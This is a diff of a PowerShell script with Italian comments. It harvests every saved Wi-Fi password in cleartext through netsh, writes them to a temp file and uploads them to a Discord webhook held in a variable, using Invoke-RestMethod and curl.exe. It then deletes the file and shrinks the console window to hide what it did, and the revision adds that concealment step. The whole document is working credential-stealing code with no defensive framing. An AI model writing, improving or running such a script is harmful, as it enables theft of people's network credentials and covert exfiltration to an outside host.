@@ -1,62 +1,74 @@
 ############################################################################################################################################################
-# Estrae le password dei profili Wi-Fi e le salva in un file temporaneo
+# Estrae le password dei profili Wi-Fi
 $wifiProfiles = (netsh wlan show profiles) | 
     Select-String "\:(.+)$" | 
     ForEach-Object {
         $name = $_.Matches.Groups[1].Value.Trim()
-        $pass = (netsh wlan show profile name="$name" key=clear | 
-                 Select-String "Key Content\W+\:(.+)$").Matches.Groups[1].Value.Trim()
+        $profileInfo = netsh wlan show profile name="$name" key=clear
         
-        # Restituisci il profilo Wi-Fi e la password
-        [PSCustomObject]@{ PROFILE_NAME = $name; PASSWORD = $pass }
+        # Estrai la password se presente
+        $passMatch = $profileInfo | Select-String "Key Content\W+:\s*(.+)$"
+        $pass = if ($passMatch) { $passMatch.Matches[0].Groups[1].Value.Trim() } else { "N/A" }
+        
+        # Crea l'oggetto con nome profilo e password
+        [PSCustomObject]@{ 
+            PROFILE_NAME = $name
+            PASSWORD = $pass 
+        }
     }
 
-# Crea il messaggio per Discord
-$message = "Ecco le password dei profili Wi-Fi salvati:`n`n"
+############################################################################################################################################################
+# Crea il messaggio formattato
+$message = "**Password Wi-Fi Recuperate**`n`n"
 foreach ($profile in $wifiProfiles) {
-    $message += "Profilo: $($profile.PROFILE_NAME)`nPassword: $($profile.PASSWORD)`n`n"
+    $message += "**Profilo:** $($profile.PROFILE_NAME)`n**Password:** $($profile.PASSWORD)`n`n"
 }
 
-# Salva i profili e le password in un file temporaneo
+# Salva temporaneamente in un file
 $outputFile = "$env:TEMP\wifi-passwords.txt"
-$message | Out-File -FilePath $outputFile -Encoding utf8
+$message | Out-File -FilePath $outputFile -Encoding UTF8
 
 ############################################################################################################################################################
-
-# Funzione per caricare le password su Discord
+# Funzione per caricare su Discord
 function Upload-Discord {
     param (
-        [string]$WebhookUrl,
-        [string]$Message,
-        [string]$FilePath
+        [string]$file,
+        [string]$text
     )
 
     $Body = @{
-        'username' = $env:username
-        'content'  = $Message
+        'username' = $env:USERNAME
+        'content' = $text
     }
 
-    # Invia il messaggio di testo
-    if (-not [string]::IsNullOrEmpty($Message)) {
-        Invoke-RestMethod -ContentType 'Application/Json' -Uri $WebhookUrl -Method Post -Body ($Body | ConvertTo-Json)
+    # Invia il messaggio testuale
+    try {
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc -Method Post -Body ($Body | ConvertTo-Json)
+    }
+    catch {
+        Write-Output "Errore nell'invio del messaggio: $_"
     }
 
-    # Carica il file delle password
-    if (Test-Path $FilePath) {
-        curl.exe -F "file1=@$FilePath" $WebhookUrl
+    # Carica il file
+    if (Test-Path $file) {
+        try {
+            curl.exe -F "file1=@$file" $dc
+        }
+        catch {
+            Write-Output "Errore nell'upload del file: $_"
+        }
     }
-}
-
-# Carica le password su Discord
-$discordWebhookUrl = "WEBHOOK_DISCORD"  # Sostituisci con il tuo URL Webhook Discord
-if (-not [string]::IsNullOrEmpty($discordWebhookUrl)) {
-    Upload-Discord -WebhookUrl $discordWebhookUrl -Message "Ecco le password dei profili Wi-Fi salvati:" -FilePath $outputFile
 }
 
 ############################################################################################################################################################
+# Esegui l'upload su Discord
+if (-not [string]::IsNullOrEmpty($dc)) {
+    Upload-Discord -file $outputFile -text $message
+}
 
-# Pulizia dei file temporanei (opzionale)
+# Pulisci i file temporanei
 Remove-Item $outputFile -ErrorAction SilentlyContinue
 
-# Visualizza un messaggio indicante la fine dell'operazione
-Write-Host "Le password Wi-Fi sono state inviate a Discord."
+# Nascondi la finestra di PowerShell dopo l'esecuzione
+$Host.UI.RawUI.WindowTitle = ''
+$Host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(0, 0)
